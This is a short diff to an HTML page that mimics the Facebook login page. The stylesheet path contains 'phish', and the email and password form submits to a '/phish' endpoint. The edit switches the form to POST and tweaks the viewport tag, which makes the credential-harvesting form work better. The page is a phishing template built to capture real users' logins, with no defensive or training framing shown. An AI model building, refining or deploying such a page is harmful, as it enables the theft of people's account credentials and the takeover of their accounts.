@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Facebook - log in or sign up</title>
     <link rel="icon" href="https://img.icons8.com/color/96/000000/facebook-new.png" type="image/png">
     <link rel="stylesheet" href="../phish/assets3/style.css">
@@ -24,14 +24,13 @@
             </div>
 
             <div class="fb-login">
-                <form action="/phish">
+                <form action="/phish" method="post">
                     <input type="text" name="email" id="login" placeholder="Email address or phone number">
                     <input type="password" name="password" id="password" placeholder="Password">
                     <i class="bi bi-eye-slash" id="togglePassword"></i>
                     <button id="btn-login">Log In</button>
                     <span class="forgotten-password" id="txt-forgotten-password"><a href="#">Forgotten
                             password?</a></span>
-
                     <hr>
 
                     <button id="btn-new-account">Create New Account</button>
